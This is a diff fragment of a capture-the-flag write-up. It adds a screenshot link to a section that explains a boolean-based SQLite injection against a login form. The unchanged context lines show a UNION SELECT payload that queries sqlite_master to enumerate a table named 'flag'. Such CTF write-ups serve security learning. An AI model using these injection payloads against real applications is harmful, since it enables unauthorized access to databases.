@@ -84,6 +84,7 @@ From that, we knew that it was boolean-based sqlite injection, so let's get to w
 
 first we need to find the name of the table using this query:
 ```username=admin'UNION+SELECT+tbl_name,NULL,NULL+FROM+sqlite_master+WHERE+tbl_name+NOT+LIKE+'sqlite_%'+AND+tbl_name+LIKE+'fla%'+--&password=asd```
+<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/lol1.PNG>
 
 throught enumerating the ```LIKE``` value we found that the table name is ```flag```.
 
